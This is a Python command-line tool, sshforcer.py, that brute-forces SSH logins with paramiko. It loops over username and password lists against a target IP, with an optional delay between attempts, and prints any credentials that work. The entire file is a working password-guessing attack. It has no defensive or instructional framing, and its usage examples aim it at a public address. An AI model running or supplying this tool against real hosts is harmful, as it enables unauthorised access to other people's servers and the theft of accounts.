import argparse
import paramiko
import socket
import time

parser = argparse.ArgumentParser(prog='sshforcer.py', usage='''python3 sshforcer.py -t <target> -u <username> -uf <file containing usernames> -p <password> -pf <file containing passwords> --port <custom port> -s <seconds to wait between each attempt>\n\n
                                                            python3 sshforcer.py -t 8.8.8.8 -u babak -p P@ssw0rd\n
                                                            python3 sshforcer.py -t 8.8.8.8 -u babak -pf passwords.txt\n
                                                            python3 sshforcer.py -t 8.8.8.8 -u babak -pf passwords.txt --port 22000 -s 5''')

parser.add_argument('-t', '--target', help='Target ip', required=True)
parser.add_argument('-u', '--username', help='Username', required=False)
parser.add_argument('-uf', '--ufile', help='File containing usernames', required=False)
parser.add_argument('-p', '--password', help='Password', required=False)
parser.add_argument('-pf', '--pfile', help='File containing passwords', required=False)
parser.add_argument('--port', help='Custom SSH port. default set to 22', required=False, default=22, type=int)
parser.add_argument('-s', '--seconds', help='Adds timer. Waits s seconds after each attempt.', required=False, default=0, type=int)
args = parser.parse_args()

#create ssh client:
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#attempt ssh login
def ssh_login_attempt(ip, port, username, password):
    try:
        ssh.connect(ip, port, username, password)

    except paramiko.AuthenticationException:
        print("Invalid credentials: {}:{}".format(username, password))

    except socket.timeout:
        print("Connection timeout! Check the ip/port and connection.")

    except paramiko.ssh_exception.NoValidConnectionsError:
        print("Cannot connect to {} on port {}!".format(ip, port))

    else:
        print("found valid creds: {}:{}".format(username, password))
        return 1

    ssh.close()

def main():
    #single username:password
    if args.username and args.password:
        ssh_login_attempt(args.target, args.port, args.username, args.password)
    #single username and a password file
    elif args.username and args.pfile:
        print("\nReading passwords from file...\n")
        file = args.pfile
        with open(file, 'r') as target_list:
            for line in target_list.readlines():
                print("-------------------------------------------------------------------------------")
                res = ssh_login_attempt(args.target, args.port, args.username, (str(line.strip())))
                if res:
                    break
                time.sleep(args.seconds)
    #username file and a single password
    elif args.ufile and args.password:
        print("\nReading usernames from file...\n")
        file = args.ufile
        with open(file, 'r') as target_list:
            for line in target_list.readlines():
                print("-------------------------------------------------------------------------------")
                res = ssh_login_attempt(args.target, args.port, (str(line.strip())), args.password)
                if res:
                    break
                time.sleep(args.seconds)
    #username file and password file            
    elif args.ufile and args.pfile:
        print("\nReading usernames and passwords from file...\n")
        usernames_file = args.ufile
        passwords_file = args.pfile
        with open(usernames_file, 'r') as usernames_list:
            for username_input in usernames_list.readlines():
                res = 0
                with open(passwords_file, 'r') as passwords_list:
                    for password_input in passwords_list.readlines():
                        print("-------------------------------------------------------------------------------")
                        res = ssh_login_attempt(args.target, args.port, str(username_input.strip()), str(password_input.strip()))
                        if res:
                            break
                        time.sleep(args.seconds)
                    
                if res:
                    break
    else:
        print("Wrong usage! use -h to get help.")


if __name__ == '__main__':

    main()